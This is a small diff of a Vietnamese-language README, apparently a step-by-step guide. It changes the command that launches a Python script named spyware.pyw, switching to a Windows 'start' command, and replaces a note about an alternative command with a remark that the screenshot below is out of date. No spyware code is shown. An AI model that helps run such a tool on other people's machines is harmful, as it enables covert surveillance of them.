@@ -41,9 +41,9 @@
 >>> 
 >>> cd <thư_mục_chứa_file_spyware.pyw>
 >>> 
->>> pyw spyware.pyw
+>>> start "" "<đường_dẫn_file_spyware.pyw>"
 >>> 
->>> **Lưu ý:** Dòng lệnh thứ 3 có thể là "pythonw spyware.pyw"
+>>> **Lưu ý:** Ảnh bên dưới lỗi đấy, do mình lười sửa cái mới"
 >>
 >> ![Bước 6](https://i.imgur.com/MWT9f8C.png)
 >
